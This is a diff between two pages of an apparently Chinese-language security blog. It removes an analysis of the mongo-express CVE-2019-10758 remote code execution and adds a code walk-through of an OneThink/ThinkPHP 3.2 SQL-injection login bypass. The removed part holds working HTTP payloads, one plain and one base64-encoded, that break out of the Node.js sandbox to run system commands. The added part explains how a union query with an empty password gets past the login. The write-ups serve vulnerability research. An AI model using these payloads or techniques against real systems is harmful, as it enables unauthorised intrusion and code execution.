@@ -31,7 +31,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-CVE-2019-10758-mongo-express-rce分析" class="article article-type-post" itemscope
+  <article id="post-onethink-登陆绕过" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -39,7 +39,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  CVE-2019-10758 mongo-express rce分析
+  onethink 登陆绕过
 </h1>
   
 
@@ -48,8 +48,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/02/03/CVE-2019-10758-mongo-express-rce%E5%88%86%E6%9E%90/" class="article-date">
-  <time datetime="2020-02-03T14:07:00.000Z" itemprop="datePublished">2020-02-03</time>
+      <a href="/2020/02/11/onethink-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/" class="article-date">
+  <time datetime="2020-02-11T08:29:00.000Z" itemprop="datePublished">2020-02-11</time>
 </a>
       
   <div class="article-category">
@@ -63,7 +63,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">474字</span>
+            <span class="post-count">1.5k字</span>
         </span>
     </span>
 
@@ -72,7 +72,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2分钟</span>
+            <span class="post-count">6分钟</span>
         </span>
     </span>
 </div>
@@ -96,30 +96,39 @@
       
 
       
-      <p>安装启动：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm安装： apt-get install npm</span><br><span class="line">nodejs安装 apt-get install nodejs</span><br><span class="line">docker run -p 27017:27017 -d mongo</span><br><span class="line">npm install mongo-express@0.53.0 </span><br><span class="line">cd node_modules&#x2F;mongo-express&#x2F; &amp;&amp; nodejs app.js</span><br></pre></td></tr></table></figure>
-
-
-<p><img src="/images/pasted-22.png" alt="upload successful"></p>
-<p>发送如下报文：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;checkValid HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Authorization: Basic YWRtaW46cGFzcw&#x3D;&#x3D;</span><br><span class="line">Content-Length: 124</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">document&#x3D;this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;open -a Calculator&quot;)</span><br></pre></td></tr></table></figure>
-<p>rce：</p>
-<p><img src="/images/pasted-23.png" alt="upload successful"></p>
-<p>如上payload，是nodejs中通过沙盒启动rce的方式，这里我们试试通过引入global全局变量rce并开启debug，发现并没有造成rce</p>
-<p><img src="/images/pasted-24.png" alt="upload successful"></p>
-<p><img src="/images/pasted-25.png" alt="upload successful"></p>
-<p>再试试直接引入child_process，发现依旧不能造成rce</p>
-<p><img src="/images/pasted-26.png" alt="upload successful"></p>
-<p><img src="/images/pasted-27.png" alt="upload successful"></p>
-<p>跟进代码，寻找漏洞触发点，并寻找这两次报错的原因：<br>在/lib/routes/document.js  29行发现doc参数会获取我们输入的document参数的值</p>
-<p><img src="/images/pasted-28.png" alt="upload successful"></p>
-<p>接下来跟进参数处理逻辑，发现会经过bson.toBSON方法，跟进该方法，发现我们传入的doc参数会经过eval函数作用从而造成rce。<br>但是此处会调用getSandbox方法对eval代码执行时的调用或者访问的变量进行沙盒处理。</p>
-<p><img src="/images/pasted-29.png" alt="upload successful"></p>
-<p>因为在vm构建的sandbox中，没有任何访问的全局变量，除了基本的syntax。所以我们跟进getSandbox方法确定在vm sandbox中我们能够访问的变量，发现在vm.runInNewContext方法中能访问到的变量只有如下这些，并不包含global和require。所以我们之前引入global全局变量和直接require都会报错就是这个原因。</p>
-<p><img src="/images/pasted-30.png" alt="upload successful"></p>
-<p>同时，因为这个地方可以允许使用Buffer变量，我们可以对我们的payload进行base64编码，然后传入buffer二进制流，也可以造成rce。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;checkValid HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8081</span><br><span class="line">User-Agent: curl&#x2F;7.64.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Authorization: Basic YWRtaW46cGFzcw&#x3D;&#x3D;</span><br><span class="line">Content-Length: 203</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">document&#x3D;new Buffer(&#96;dGhpcy5jb25zdHJ1Y3Rvci5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJvcGVuIC1hIENhbGN1bGF0b3IiKQ&#x3D;&#x3D;&#96;,&#96;base64&#96;).toString()</span><br></pre></td></tr></table></figure>
-
+      <p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;onethink&#x2F;wwwroot&#x2F;admin.php?s&#x3D;&#x2F;Public&#x2F;login.html HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.1.105:9097</span><br><span class="line">Content-Length: 89</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.1.105:9097</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.1.105:9097&#x2F;onethink&#x2F;wwwroot&#x2F;admin.php?s&#x3D;&#x2F;Public&#x2F;login.html</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Cookie: PHPSESSID&#x3D;1a4ecfcc5a76854ffe525750db9ed20e; XDEBUG_SESSION&#x3D;11437</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username[]&#x3D;xxxxx(payload)&amp;password&#x3D;&amp;verify&#x3D;njadc</span><br></pre></td></tr></table></figure>
+<p>onethink是基于tp3.2框架的cms，很早就知道了tp3.2的一些注入漏洞，但一直没自己亲手跟过，所以这次借这个onethink的漏洞对tp3.2一些经典的注入做一个基本了解。</p>
+<p>首先确定漏洞点为后台口登陆时触发，本地搭建环境，因为我们知道大部分的thinkphp的框架都可以通过开启报错功能查看调用栈，我们稍微修改一下payload，让网页报错，可以看到调用栈如下：</p>
+<p><img src="/images/pasted-54.png" alt="upload successful"></p>
+<p><img src="/images/pasted-55.png" alt="upload successful"></p>
+<p>前面为程序运行时需要加载的thinkphp的框架，我们注意点在后面，从Admin\Controller\PublicController-&gt;login(Array, ‘’, ‘njadc’)处跟进，在Application/Admin/Controller/PublicController.class.php中line32：</p>
+<p><img src="/images/pasted-58.png" alt="upload successful"><br>跟进login方法，在/Application/User/Api/UserApi.class.php line41：<br><img src="/images/pasted-59.png" alt="upload successful"><br>根据上面框架打印的调用栈可知，login方法在Application/User/Model/UcenterMemberModel.class.php line128：<br><img src="/images/pasted-60.png" alt="upload successful"><br>前面根据登陆类型将$username即我们登陆时传入的用户名的值赋值给$map[‘username’]，即$map我们可控，接下来我们注意下面，$user = $this-&gt;where($map)-&gt;find();。首先跟进where方法，在/ThinkPHP/Library/Think/Model.class.php line1766:<br><img src="/images/pasted-61.png" alt="upload successful"></p>
+<p>前面都是根据传入的where参数和parse参数的具体情况（这里$parse为null）对$where变量进行数组键值对的赋值处理，在最后一个if循环中我们注意到，如果传入的$where为数组，将会直接无过滤的赋值给$this-&gt;options[‘where’]，最后函数返回该值。接下来我们跟进find方法，在/ThinkPHP/Library/Think/Model.class.php line724：<br><img src="/images/pasted-62.png" alt="upload successful"></p>
+<p>前面通过$this-&gt;getPK()获得主键记录，并且如果$pk参数为数组，即为复合主键的情况下，根据id获取主键记录，然后执行$options[‘where’]=$where的赋值操作。这里我们重点关注下面的分析表达式语句，跟进$this-&gt;_parseOptions方法</p>
+<p><img src="/images/pasted-63.png" alt="upload successful"></p>
+<p>在/ThinkPHP/Library/Think/Model.class.php  line631:</p>
+<p><img src="/images/pasted-64.png" alt="upload successful"></p>
+<p>这里主要说明了根据表名（自动获取、手动指定）对数据表字段列表的获取，并且对数组查询条件进行字段类型检查（bigint、int、bool、double等类型）的操作，最后会进入到$this-&gt;_options_filter方法，跟进该私有方法：</p>
+<p><img src="/images/pasted-65.png" alt="upload successful"></p>
+<p>没有做任何操作的空函数，所以最开始传入的$where（即username[]）的值可以毫无过滤的赋值给$options，最终_parseOptions方法返回没有经过任何过滤的$options变量。<br>返回find()方法，继续跟进数据库查询操作select()方法，在/ThinkPHP/Library/Think/Db.class.php line778：</p>
+<p><img src="/images/pasted-66.png" alt="upload successful"></p>
+<p>先通过$this-&gt;buildSelectSql方法获得要执行的sql语句，再查询缓存检测，然后通过$this-&gt;query函数执行sql语句，这里我们跟进buidSelectSql方法看下是怎么获取到数据库要执行的语句的。</p>
+<p><img src="/images/pasted-67.png" alt="upload successful"></p>
+<p>前面为根据页面计算limit以及sql执行语句创建缓存，缓存是由thinkphp自带的缓存框架实现的，这里我们不过多探讨，跟进$this-&gt;parseSql方法：</p>
+<p><img src="/images/pasted-68.png" alt="upload successful"></p>
+<p>这里做了一次替换操作，将$sql的值换成对应的options数组的值，因为我们触发点是登陆时输入的账号密码，按照sql语句应该是select * from xxx where username=’xxx’ and password=’xxx’，所以我们需要关注图上的$this-&gt;parsewhere方法，在line 412：</p>
+<p><img src="/images/pasted-69.png" alt="upload successful"></p>
+<p>这里对查询字段的条件情况进行了判断，如果$where是不是数组而是字符串那么直接赋值给$wherestr，但我们这里是登陆处，并且根据断点情况也能知道$options[‘where’]即$where为数组形式，即条件为where username=’xxx’ and password=’xxx’所以会进入else，接着会根据数组里是否含有and or xor的关键字进行具体的逻辑运算操作，如果没有，默认就会对多个条件进行and运算。然后进入foreach,如果不是特殊表达式的话走进一层正则判断，如果开头不是A-Z  _  |  &amp; - . a-z 0-9 ( ) 这些字符的话，则会抛出错误，接下来按照逻辑走进$this-&gt;WhereItem方法：</p>
+<p><img src="/images/pasted-70.png" alt="upload successful"></p>
+<p>其中，在in运算和between运算中不存在^和$的正则匹配，当然比较运算也是直接正则匹配后，将$val数组拼接赋值给$wherestr。最后返回完整的where条件。到了这里我们可以肯定整个where条件赋值的过程中不存在任何过滤，即传入的username[]参数完全可控。<br>接下来，数据库解释执行的地方不再赘述，接下来回到Application/User/Model/UcenterMemberModel.class.php中，进入验证用户密码阶段：</p>
+<p><img src="/images/pasted-71.png" alt="upload successful"></p>
+<p>根据用户名的查询获取到密码即为$user[‘password’]，然后将传入的password进行md5加密与获取到的密码进行比对，如果完全相等则登陆成功。我们先看看key是个什么东西。</p>
+<p><img src="/images/pasted-72.png" alt="upload successful"></p>
+<p>可以发现，key非常复杂，并且是/Application/User/Conf/config.php里面，该文件为UCenter客户端配置文件，熟悉的朋友可以知道这里加密的key针对不同的网站值是不同的随机的，我们也无法通过文件读取漏洞读到该key的值，所以这里我们跟进think_ucenter_md5()：</p>
+<p><img src="/images/pasted-73.png" alt="upload successful"><br>发现传入的密码即$password如果为空，则结果返回为空，这里我们可以通过之前确定的sql注入利用联合查询指定密码字段位(密码字段位数为3)为空，从而达到绕过登陆进入后台的操作。（in操作涉及到mysql弱类型转换的问题）</p>
+<p>成功登陆后台：</p>
+<p><img src="/images/pasted-74.png" alt="upload successful"></p>
 <p>know it then enjoy it~</p>
 
       
@@ -131,10 +140,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/03/CVE-2019-10758-mongo-express-rce%E5%88%86%E6%9E%90/" data-id="ck6hn5uqe00007rttcjxo14wa"
+      <a data-url="http://yoursite.com/2020/02/11/onethink-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87/" data-id="ck6hn5uqt00027rtt0hil21hl"
         class="article-share-link">分享</a>
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li></ul>
 
     </footer>
 
@@ -144,19 +153,10 @@
   
   <nav class="article-nav">
     
+    
       <a href="/2020/02/03/tp6-6-0-1-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E4%B8%8E%E5%88%A0%E9%99%A4/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            tp6&lt;6.0.1 任意文件写入与删除
-          
-        </div>
-      </a>
-    
-    
-      <a href="/2020/02/03/pma-4-0-4-9-3%E3%80%815-0sql%E6%B3%A8%E5%85%A5/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">pma 4.0-4.9.3、5.0sql注入</div>
+        <div class="article-nav-title">tp6&lt;6.0.1 任意文件写入与删除</div>
       </a>
     
   </nav>
